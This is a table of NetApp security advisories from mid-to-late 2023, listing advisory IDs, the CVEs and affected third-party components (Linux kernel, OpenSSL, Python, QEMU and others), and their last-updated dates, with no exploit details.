| [**NTAP-20231006-0008**](https://security.netapp.com/advisory/ntap-20231006-0008/) | August 2023 GNU Binutils Vulnerabilities in NetApp Products | 2024-11-05 |
| [**NTAP-20231006-0005**](https://security.netapp.com/advisory/ntap-20231006-0005/) | August 2023 GNU Ncurses Vulnerabilities in NetApp Products | 2023-12-14 |
| [**NTAP-20231006-0011**](https://security.netapp.com/advisory/ntap-20231006-0011/) | CVE-2016-1000338 Bouncy Castle Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20231006-0002**](https://security.netapp.com/advisory/ntap-20231006-0002/) | CVE-2020-22218 Libssh2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20231006-0012**](https://security.netapp.com/advisory/ntap-20231006-0012/) | CVE-2020-24165 QEMU Vulnerability in NetApp Products | 2023-10-06 |
| [**NTAP-20231006-0009**](https://security.netapp.com/advisory/ntap-20231006-0009/) | CVE-2020-35342 GNU Binutils Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20231006-0001**](https://security.netapp.com/advisory/ntap-20231006-0001/) | CVE-2021-32050 MongoDB Drivers Vulnerability in NetApp Products | 2023-10-06 |
| [**NTAP-20231006-0010**](https://security.netapp.com/advisory/ntap-20231006-0010/) | CVE-2022-35205 GNU Binutils Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20231006-0004**](https://security.netapp.com/advisory/ntap-20231006-0004/) | CVE-2022-36648 QEMU Vulnerability in NetApp Products | 2023-10-06 |
| [**NTAP-20231006-0003**](https://security.netapp.com/advisory/ntap-20231006-0003/) | CVE-2022-45703 GNU Binutils Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20231006-0007**](https://security.netapp.com/advisory/ntap-20231006-0007/) | CVE-2022-48565 Python Vulnerability in NetApp Products | 2023-10-06 |
| [**NTAP-20231006-0013**](https://security.netapp.com/advisory/ntap-20231006-0013/) | CVE-2022-48566 Python Vulnerability in NetApp Products | 2024-03-15 |
| [**NTAP-20231006-0006**](https://security.netapp.com/advisory/ntap-20231006-0006/) | CVE-2023-32559 Node.js Vulnerability in NetApp Products | 2023-10-10 |
| [**NTAP-20231006-0014**](https://security.netapp.com/advisory/ntap-20231006-0014/) | CVE-2023-40217 Python Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20231006-0015**](https://security.netapp.com/advisory/ntap-20231006-0015/) | CVE-2023-41105 Python Vulnerability in NetApp Products | 2023-11-07 |
| [**NTAP-20230929-0003**](https://security.netapp.com/advisory/ntap-20230929-0003/) | April 2023 Linux Kernel 6.2 Vulnerabilities in NetApp Products | 2023-09-29 |
| [**NTAP-20230929-0007**](https://security.netapp.com/advisory/ntap-20230929-0007/) | CVE-2020-21490 GNU Binutils Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230929-0010**](https://security.netapp.com/advisory/ntap-20230929-0010/) | CVE-2021-32292 JSON-C Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230929-0001**](https://security.netapp.com/advisory/ntap-20230929-0001/) | CVE-2022-4269 Linux Kernel Vulnerability in NetApp Products | 2023-09-29 |
| [**NTAP-20230929-0008**](https://security.netapp.com/advisory/ntap-20230929-0008/) | CVE-2022-48560 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230929-0009**](https://security.netapp.com/advisory/ntap-20230929-0009/) | CVE-2022-48564 Python Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230929-0006**](https://security.netapp.com/advisory/ntap-20230929-0006/) | CVE-2023-1206 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230929-0004**](https://security.netapp.com/advisory/ntap-20230929-0004/) | CVE-2023-2269 Linux Kernel Vulnerability in NetApp Products | 2023-09-29 |
| [**NTAP-20230929-0002**](https://security.netapp.com/advisory/ntap-20230929-0002/) | CVE-2023-2898 Linux Kernel Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20230929-0005**](https://security.netapp.com/advisory/ntap-20230929-0005/) | CVE-2023-3212 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230929-0011**](https://security.netapp.com/advisory/ntap-20230929-0011/) | CVE-2023-4863 Libwebp Vulnerability in NetApp Products | 2023-11-02 |
| [**NTAP-20230921-0004**](https://security.netapp.com/advisory/ntap-20230921-0004/) | CVE-2022-22483 IBM Db2 Vulnerability in NetApp Products | 2023-09-21 |
| [**NTAP-20230921-0002**](https://security.netapp.com/advisory/ntap-20230921-0002/) | CVE-2022-33894 Intel BIOS Firmware Vulnerability in NetApp Products | 2023-09-21 |
| [**NTAP-20230921-0003**](https://security.netapp.com/advisory/ntap-20230921-0003/) | CVE-2022-35637 IBM Db2 Vulnerability in NetApp Products | 2023-09-21 |
| [**NTAP-20230921-0007**](https://security.netapp.com/advisory/ntap-20230921-0007/) | CVE-2023-1409 MongoDB Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230921-0005**](https://security.netapp.com/advisory/ntap-20230921-0005/) | CVE-2023-35011 IBM Cognos Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20230921-0006**](https://security.netapp.com/advisory/ntap-20230921-0006/) | CVE-2023-41080 Apache Tomcat Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20230921-0001**](https://security.netapp.com/advisory/ntap-20230921-0001/) | CVE-2023-4807 OpenSSL Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20230915-0009**](https://security.netapp.com/advisory/ntap-20230915-0009/) | August 2023 Node.js Vulnerabilities in NetApp Products | 2023-09-15 |
| [**NTAP-20230915-0002**](https://security.netapp.com/advisory/ntap-20230915-0002/) | August 2023 PostgreSQL Vulnerabilities in NetApp Products | 2024-02-12 |
| [**NTAP-20230915-0001**](https://security.netapp.com/advisory/ntap-20230915-0001/) | CVE-2021-3236 Vim Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230915-0003**](https://security.netapp.com/advisory/ntap-20230915-0003/) | CVE-2022-41804 Intel Processor Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20230915-0008**](https://security.netapp.com/advisory/ntap-20230915-0008/) | CVE-2022-48522 Perl Vulnerability in NetApp Products | 2024-02-21 |
| [**NTAP-20230915-0007**](https://security.netapp.com/advisory/ntap-20230915-0007/) | CVE-2023-22276 Intel Ethernet Controller Vulnerability in NetApp Products | 2023-09-15 |
| [**NTAP-20230915-0013**](https://security.netapp.com/advisory/ntap-20230915-0013/) | CVE-2023-25775 Intel Ethernet Controller Vulnerability in NetApp Products | 2023-09-15 |
| [**NTAP-20230915-0006**](https://security.netapp.com/advisory/ntap-20230915-0006/) | CVE-2023-32248 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20230915-0005**](https://security.netapp.com/advisory/ntap-20230915-0005/) | CVE-2023-34478 Apache Shiro Vulnerability in NetApp Products | 2024-06-13 |
| [**NTAP-20230915-0010**](https://security.netapp.com/advisory/ntap-20230915-0010/) | CVE-2023-38426 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20230915-0014**](https://security.netapp.com/advisory/ntap-20230915-0014/) | CVE-2023-39975 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20230915-0004**](https://security.netapp.com/advisory/ntap-20230915-0004/) | CVE-2023-40360 QEMU Vulnerability in NetApp Products | 2023-09-15 |
| [**NTAP-20230915-0012**](https://security.netapp.com/advisory/ntap-20230915-0012/) | CVE-2023-4135 QEMU Vulnerability in NetApp Products | 2023-09-15 |
| [**NTAP-20230915-0011**](https://security.netapp.com/advisory/ntap-20230915-0011/) | July 2023 Linux Kernel 6.3.9 Vulnerabilities in NetApp Products | 2024-10-22 |
| [**NTAP-20230908-0007**](https://security.netapp.com/advisory/ntap-20230908-0007/) | August 2023 Brocade Fabric OS Vulnerabilities | 2023-09-08 |
| [**NTAP-20230908-0003**](https://security.netapp.com/advisory/ntap-20230908-0003/) | CVE-2020-26708 requests-xml Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20230908-0008**](https://security.netapp.com/advisory/ntap-20230908-0008/) | CVE-2022-24963 Apache Portable Runtime (APR) Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230908-0005**](https://security.netapp.com/advisory/ntap-20230908-0005/) | CVE-2022-24999 Node.js Vulnerability in NetApp Products | 2023-09-08 |
| [**NTAP-20230908-0006**](https://security.netapp.com/advisory/ntap-20230908-0006/) | CVE-2023-1255 OpenSSL Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20230908-0001**](https://security.netapp.com/advisory/ntap-20230908-0001/) | CVE-2023-3269 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20230908-0004**](https://security.netapp.com/advisory/ntap-20230908-0004/) | CVE-2023-36054 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20230908-0002**](https://security.netapp.com/advisory/ntap-20230908-0002/) | CVE-2023-3611 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20230831-0009**](https://security.netapp.com/advisory/ntap-20230831-0009/) | August 2023 Golang Vulnerabilities in NetApp Products | 2023-10-04 |
| [**NTAP-20230831-0004**](https://security.netapp.com/advisory/ntap-20230831-0004/) | CVE-2023-26045 Node.js Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230831-0010**](https://security.netapp.com/advisory/ntap-20230831-0010/) | CVE-2023-29409 Golang Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230831-0008**](https://security.netapp.com/advisory/ntap-20230831-0008/) | CVE-2023-3180 QEMU Vulnerability in NetApp Products | 2023-08-31 |
| [**NTAP-20230831-0006**](https://security.netapp.com/advisory/ntap-20230831-0006/) | CVE-2023-3494 FreeBSD Vulnerability in NetApp Products | 2023-08-31 |
| [**NTAP-20230831-0014**](https://security.netapp.com/advisory/ntap-20230831-0014/) | CVE-2023-35009 IBM Cognos Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20230831-0001**](https://security.netapp.com/advisory/ntap-20230831-0001/) | CVE-2023-38428 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230831-0003**](https://security.netapp.com/advisory/ntap-20230831-0003/) | CVE-2023-38430 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230831-0002**](https://security.netapp.com/advisory/ntap-20230831-0002/) | CVE-2023-38432 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230831-0011**](https://security.netapp.com/advisory/ntap-20230831-0011/) | CVE-2023-38633 GNOME Librsvg Vulnerability in NetApp Products | 2023-08-31 |
| [**NTAP-20230831-0012**](https://security.netapp.com/advisory/ntap-20230831-0012/) | CVE-2023-3896 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20230831-0013**](https://security.netapp.com/advisory/ntap-20230831-0013/) | CVE-2023-4009 MongoDB Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230831-0007**](https://security.netapp.com/advisory/ntap-20230831-0007/) | July 2023 Node.js Vulnerabilities in NetApp Products | 2023-11-01 |
| [**NTAP-20230831-0005**](https://security.netapp.com/advisory/ntap-20230831-0005/) | July 2023 QEMU Vulnerabilities in NetApp Products | 2023-08-31 |
| [**NTAP-20230825-0001**](https://security.netapp.com/advisory/ntap-20230825-0001/) | August 2023 PHP Vulnerabilities in NetApp Products | 2023-09-11 |
| [**NTAP-20230825-0002**](https://security.netapp.com/advisory/ntap-20230825-0002/) | July 2023 Grub Vulnerabilities in NetApp Products | 2024-12-20 |
| [**NTAP-20230824-0013**](https://security.netapp.com/advisory/ntap-20230824-0013/) | CVE-2021-32256 GNU Binutils Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20230824-0009**](https://security.netapp.com/advisory/ntap-20230824-0009/) | CVE-2022-31693 VMware Tools Vulnerability in NetApp Products | 2023-08-24 |
| [**NTAP-20230824-0003**](https://security.netapp.com/advisory/ntap-20230824-0003/) | CVE-2023-23908 Intel Processor Vulnerability in NetApp Products | 2023-09-04 |
| [**NTAP-20230824-0006**](https://security.netapp.com/advisory/ntap-20230824-0006/) | CVE-2023-3268 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230824-0008**](https://security.netapp.com/advisory/ntap-20230824-0008/) | CVE-2023-33201 Bouncy Castle Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230824-0005**](https://security.netapp.com/advisory/ntap-20230824-0005/) | CVE-2023-3338 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230824-0007**](https://security.netapp.com/advisory/ntap-20230824-0007/) | CVE-2023-35001 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230824-0012**](https://security.netapp.com/advisory/ntap-20230824-0012/) | CVE-2023-3618 LibTIFF Vulnerability in NetApp Products | 2023-08-24 |
| [**NTAP-20230824-0010**](https://security.netapp.com/advisory/ntap-20230824-0010/) | CVE-2023-38325 Python Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20230824-0002**](https://security.netapp.com/advisory/ntap-20230824-0002/) | Intel SA-00783 CSME Vulnerabilities in NetApp Products | 2023-08-24 |
| [**NTAP-20230824-0001**](https://security.netapp.com/advisory/ntap-20230824-0001/) | Intel SA-00813 BIOS Firmware Vulnerabilities in NetApp Products | 2023-08-24 |
| [**NTAP-20230824-0011**](https://security.netapp.com/advisory/ntap-20230824-0011/) | July 2023 Linux Kernel 6.3.7 Vulnerabilities in NetApp Products | 2024-10-18 |
| [**NTAP-20230824-0004**](https://security.netapp.com/advisory/ntap-20230824-0004/) | July 2023 Linux Kernel 6.4 Vulnerabilities in NetApp Products | 2024-10-18 |
| [**NTAP-20230818-0001**](https://security.netapp.com/advisory/ntap-20230818-0001/) | CVE-2019-12402 Apache Commons Compress Vulnerability in NetApp Products | 2023-08-18 |
| [**NTAP-20230818-0007**](https://security.netapp.com/advisory/ntap-20230818-0007/) | CVE-2020-10650 FasterXML jackson-databind Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230818-0010**](https://security.netapp.com/advisory/ntap-20230818-0010/) | CVE-2021-23463 H2 Database Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230818-0002**](https://security.netapp.com/advisory/ntap-20230818-0002/) | CVE-2021-40690 Apache XML Security for Java Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20230818-0015**](https://security.netapp.com/advisory/ntap-20230818-0015/) | CVE-2022-1471 SnakeYAML Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20230818-0011**](https://security.netapp.com/advisory/ntap-20230818-0011/) | CVE-2022-23221 H2 Database Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230818-0017**](https://security.netapp.com/advisory/ntap-20230818-0017/) | CVE-2023-27558 IBM Db2 Vulnerability in NetApp Products | 2023-08-22 |
| [**NTAP-20230818-0008**](https://security.netapp.com/advisory/ntap-20230818-0008/) | CVE-2023-2976 Guava Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20230818-0006**](https://security.netapp.com/advisory/ntap-20230818-0006/) | CVE-2023-30861 Flask Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230818-0004**](https://security.netapp.com/advisory/ntap-20230818-0004/) | CVE-2023-3390 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230818-0009**](https://security.netapp.com/advisory/ntap-20230818-0009/) | CVE-2023-34455 Apache Kafka Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20230818-0013**](https://security.netapp.com/advisory/ntap-20230818-0013/) | CVE-2023-35012 IBM Db2 Vulnerability in NetApp Products | 2023-08-22 |
| [**NTAP-20230818-0014**](https://security.netapp.com/advisory/ntap-20230818-0014/) | CVE-2023-3817 OpenSSL Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20230818-0016**](https://security.netapp.com/advisory/ntap-20230818-0016/) | CVE-2023-38403 iperf3 Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230818-0003**](https://security.netapp.com/advisory/ntap-20230818-0003/) | February 2023 Werkzeug Vulnerabilities in NetApp Products | 2023-08-18 |
| [**NTAP-20230818-0012**](https://security.netapp.com/advisory/ntap-20230818-0012/) | July 2023 JetBrains Kotlin Vulnerabilities in NetApp Products | 2023-11-15 |
| [**NTAP-20230818-0005**](https://security.netapp.com/advisory/ntap-20230818-0005/) | July 2023 Linux Kernel 6.3 Vulnerabilities in NetApp Products | 2024-10-22 |
| [**NTAP-20230814-0007**](https://security.netapp.com/advisory/ntap-20230814-0007/) | CVE-2021-31294 Redis Vulnerability in NetApp Products | 2023-11-07 |
| [**NTAP-20230814-0006**](https://security.netapp.com/advisory/ntap-20230814-0006/) | CVE-2022-24834 Redis Vulnerability in NetApp Products | 2023-10-09 |
| [**NTAP-20230814-0003**](https://security.netapp.com/advisory/ntap-20230814-0003/) | CVE-2023-2878 Kubernetes Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230814-0001**](https://security.netapp.com/advisory/ntap-20230814-0001/) | CVE-2023-28953 IBM Cognos Vulnerability in NetApp Products | 2023-08-14 |
| [**NTAP-20230814-0002**](https://security.netapp.com/advisory/ntap-20230814-0002/) | CVE-2023-29406 Golang Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230814-0008**](https://security.netapp.com/advisory/ntap-20230814-0008/) | CVE-2023-34034 Spring Security Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20230814-0009**](https://security.netapp.com/advisory/ntap-20230814-0009/) | CVE-2023-36824 Redis Vulnerability in NetApp Products | 2023-10-10 |
| [**NTAP-20230814-0005**](https://security.netapp.com/advisory/ntap-20230814-0005/) | July 2023 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-03-11 |
| [**NTAP-20230814-0004**](https://security.netapp.com/advisory/ntap-20230814-0004/) | July 2023 MegaRAC BMC Firmware Vulnerabilities in NetApp Products | 2024-10-18 |
| [**NTAP-20230811-0001**](https://security.netapp.com/advisory/ntap-20230811-0001/) | CVE-2022-40982 Intel Processor Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20230804-0001**](https://security.netapp.com/advisory/ntap-20230804-0001/) | CVE-2023-3107 FreeBSD Vulnerability in NetApp Products | 2023-09-11 |
| [**NTAP-20230803-0008**](https://security.netapp.com/advisory/ntap-20230803-0008/) | CVE-2023-30586 Node.js Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230803-0009**](https://security.netapp.com/advisory/ntap-20230803-0009/) | CVE-2023-30589 Node.js Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230803-0005**](https://security.netapp.com/advisory/ntap-20230803-0005/) | CVE-2023-34457 Python Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230803-0011**](https://security.netapp.com/advisory/ntap-20230803-0011/) | CVE-2023-3446 OpenSSL Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20230803-0001**](https://security.netapp.com/advisory/ntap-20230803-0001/) | CVE-2023-34462 Apache Netty Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20230803-0003**](https://security.netapp.com/advisory/ntap-20230803-0003/) | CVE-2023-35827 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230803-0007**](https://security.netapp.com/advisory/ntap-20230803-0007/) | CVE-2023-35947 Gradle Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230803-0010**](https://security.netapp.com/advisory/ntap-20230803-0010/) | CVE-2023-38408 OpenSSH Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230803-0006**](https://security.netapp.com/advisory/ntap-20230803-0006/) | July 2023 IBM DB2 JDBC Driver Vulnerabilities in NetApp Products | 2023-08-03 |
| [**NTAP-20230803-0004**](https://security.netapp.com/advisory/ntap-20230803-0004/) | July 2023 Kubernetes Vulnerabilities in NetApp Products | 2023-10-04 |
| [**NTAP-20230803-0002**](https://security.netapp.com/advisory/ntap-20230803-0002/) | June 2023 Linux Kernel Vulnerabilities in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0009**](https://security.netapp.com/advisory/ntap-20230731-0009/) | CVE-2015-20109 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0006**](https://security.netapp.com/advisory/ntap-20230731-0006/) | CVE-2023-1295 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0004**](https://security.netapp.com/advisory/ntap-20230731-0004/) | CVE-2023-2908 LibTIFF Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230731-0002**](https://security.netapp.com/advisory/ntap-20230731-0002/) | CVE-2023-3090 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0005**](https://security.netapp.com/advisory/ntap-20230731-0005/) | CVE-2023-3312 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0001**](https://security.netapp.com/advisory/ntap-20230731-0001/) | CVE-2023-3389 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0003**](https://security.netapp.com/advisory/ntap-20230731-0003/) | CVE-2023-35946 Gradle Vulnerability in NetApp Products | 2024-02-08 |
| [**NTAP-20230731-0008**](https://security.netapp.com/advisory/ntap-20230731-0008/) | January 2023 MegaRAC BMC Firmware Vulnerabilities in NetApp Products | 2024-10-18 |
| [**NTAP-20230731-0007**](https://security.netapp.com/advisory/ntap-20230731-0007/) | July 2023 IBM DB2 Vulnerabilities in NetApp Products | 2023-08-03 |
| [**NTAP-20230731-0010**](https://security.netapp.com/advisory/ntap-20230731-0010/) | July 2023 Samba Vulnerabilities in NetApp Products | 2023-07-31 |
| [**NTAP-20230725-0003**](https://security.netapp.com/advisory/ntap-20230725-0003/) | CVE-2020-23064 jQuery Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230725-0001**](https://security.netapp.com/advisory/ntap-20230725-0001/) | CVE-2023-20867 VMware Tools Vulnerability in NetApp Products | 2023-08-02 |
| [**NTAP-20230725-0004**](https://security.netapp.com/advisory/ntap-20230725-0004/) | CVE-2023-2975 OpenSSL Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20230725-0002**](https://security.netapp.com/advisory/ntap-20230725-0002/) | CVE-2023-36617 Ruby Vulnerability in NetApp Products | 2023-07-25 |
| [**NTAP-20230725-0006**](https://security.netapp.com/advisory/ntap-20230725-0006/) | July 2023 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20230725-0005**](https://security.netapp.com/advisory/ntap-20230725-0005/) | July 2023 MySQL Server Vulnerabilities in NetApp Products | 2024-05-17 |
| [**NTAP-20230714-0001**](https://security.netapp.com/advisory/ntap-20230714-0001/) | CVE-2023-0045 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230714-0004**](https://security.netapp.com/advisory/ntap-20230714-0004/) | CVE-2023-3128 Grafana Vulnerability in NetApp Products | 2023-07-14 |
| [**NTAP-20230714-0005**](https://security.netapp.com/advisory/ntap-20230714-0005/) | CVE-2023-3326 FreeBSD Vulnerability in NetApp Products | 2023-07-14 |
| [**NTAP-20230714-0003**](https://security.netapp.com/advisory/ntap-20230714-0003/) | CVE-2023-34981 Apache Tomcat Vulnerability in NetApp Products | 2023-07-14 |
| [**NTAP-20230714-0002**](https://security.netapp.com/advisory/ntap-20230714-0002/) | CVE-2023-35788 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230713-0001**](https://security.netapp.com/advisory/ntap-20230713-0001/) | CVE-2023-27312 Privilege Escalation Vulnerability in SnapCenter Plugin for VMware vSphere | 2023-07-13 |
| [**NTAP-20230713-0002**](https://security.netapp.com/advisory/ntap-20230713-0002/) | CVE-2023-27313 Privilege Escalation Vulnerability in SnapCenter | 2023-07-13 |
| [**NTAP-20230706-0007**](https://security.netapp.com/advisory/ntap-20230706-0007/) | CVE-2020-35525 SQLite Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230706-0003**](https://security.netapp.com/advisory/ntap-20230706-0003/) | CVE-2020-36732 Node.js Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20230706-0008**](https://security.netapp.com/advisory/ntap-20230706-0008/) | CVE-2022-3515 Libksba Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20230706-0009**](https://security.netapp.com/advisory/ntap-20230706-0009/) | CVE-2023-26965 LibTIFF Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230706-0001**](https://security.netapp.com/advisory/ntap-20230706-0001/) | CVE-2023-2700 Libvirt Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230706-0004**](https://security.netapp.com/advisory/ntap-20230706-0004/) | CVE-2023-3141 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230706-0005**](https://security.netapp.com/advisory/ntap-20230706-0005/) | June 2023 Apache Struts Vulnerabilities in NetApp Products | 2023-07-07 |
| [**NTAP-20230706-0002**](https://security.netapp.com/advisory/ntap-20230706-0002/) | June 2023 Grafana Vulnerabilities in NetApp Products | 2023-07-06 |
| [**NTAP-20230706-0006**](https://security.netapp.com/advisory/ntap-20230706-0006/) | June 2023 PostgreSQL Vulnerabilities in NetApp Products | 2024-08-01 |
| [**NTAP-20230703-0003**](https://security.netapp.com/advisory/ntap-20230703-0003/) | CVE-2015-20108 Ruby Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20230703-0004**](https://security.netapp.com/advisory/ntap-20230703-0004/) | CVE-2022-48502 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230703-0008**](https://security.netapp.com/advisory/ntap-20230703-0008/) | CVE-2023-20883 Spring Boot Vulnerability in NetApp Products | 2023-08-08 |
| [**NTAP-20230703-0006**](https://security.netapp.com/advisory/ntap-20230703-0006/) | CVE-2023-2598 Linux Kernel Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20230703-0001**](https://security.netapp.com/advisory/ntap-20230703-0001/) | CVE-2023-2650 OpenSSL Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20230703-0009**](https://security.netapp.com/advisory/ntap-20230703-0009/) | CVE-2023-2731 Libtiff Vulnerability in NetApp Products | 2023-07-03 |
| [**NTAP-20230703-0005**](https://security.netapp.com/advisory/ntap-20230703-0005/) | CVE-2023-2953 OpenLDAP Vulnerability in NetApp Products | 2024-07-01 |
| [**NTAP-20230703-0007**](https://security.netapp.com/advisory/ntap-20230703-0007/) | CVE-2023-3111 Linux Kernel Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20230703-0010**](https://security.netapp.com/advisory/ntap-20230703-0010/) | June 2023 ISC BIND Vulnerabilities in NetApp Products | 2023-11-30 |
| [**NTAP-20230703-0002**](https://security.netapp.com/advisory/ntap-20230703-0002/) | May 2023 Libtiff Vulnerability in NetApp Products | 2023-07-03 |
| [**NTAP-20230622-0009**](https://security.netapp.com/advisory/ntap-20230622-0009/) | CVE-2018-3745 Node.js Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20230622-0005**](https://security.netapp.com/advisory/ntap-20230622-0005/) | CVE-2020-36694 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230622-0003**](https://security.netapp.com/advisory/ntap-20230622-0003/) | CVE-2021-39036 IBM Cognos Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20230622-0008**](https://security.netapp.com/advisory/ntap-20230622-0008/) | CVE-2022-25881 HTTP-Cache-Semantics Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230622-0010**](https://security.netapp.com/advisory/ntap-20230622-0010/) | CVE-2023-2124 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230622-0001**](https://security.netapp.com/advisory/ntap-20230622-0001/) | CVE-2023-2156 Linux Kernel Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230622-0004**](https://security.netapp.com/advisory/ntap-20230622-0004/) | CVE-2023-28410 Intel Graphics Drivers Vulnerability in NetApp Products | 2023-06-22 |
| [**NTAP-20230622-0002**](https://security.netapp.com/advisory/ntap-20230622-0002/) | CVE-2023-31125 Node.js Vulnerability in NetApp Products | 2023-06-22 |
| [**NTAP-20230622-0006**](https://security.netapp.com/advisory/ntap-20230622-0006/) | CVE-2023-33250 Linux Kernel Vulnerability in NetApp Products | 2023-07-03 |
| [**NTAP-20230622-0007**](https://security.netapp.com/advisory/ntap-20230622-0007/) | May 2023 Node.js Vulnerabilities in NetApp Products | 2023-07-12 |
| [**NTAP-20230616-0001**](https://security.netapp.com/advisory/ntap-20230616-0001/) | CVE-2022-40540 Linux Kernel Vulnerability in NetApp Products | 2023-07-07 |
| [**NTAP-20230616-0004**](https://security.netapp.com/advisory/ntap-20230616-0004/) | CVE-2023-28709 Apache Tomcat Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20230616-0003**](https://security.netapp.com/advisory/ntap-20230616-0003/) | CVE-2023-30086 Libtiff Vulnerability in NetApp Products | 2023-06-16 |
| [**NTAP-20230616-0005**](https://security.netapp.com/advisory/ntap-20230616-0005/) | CVE-2023-31655 Redis Vulnerability in NetApp Products | 2023-12-21 |
| [**NTAP-20230616-0002**](https://security.netapp.com/advisory/ntap-20230616-0002/) | CVE-2023-32233 Linux Kernel Vulnerability in NetApp Products | 2023-06-28 |
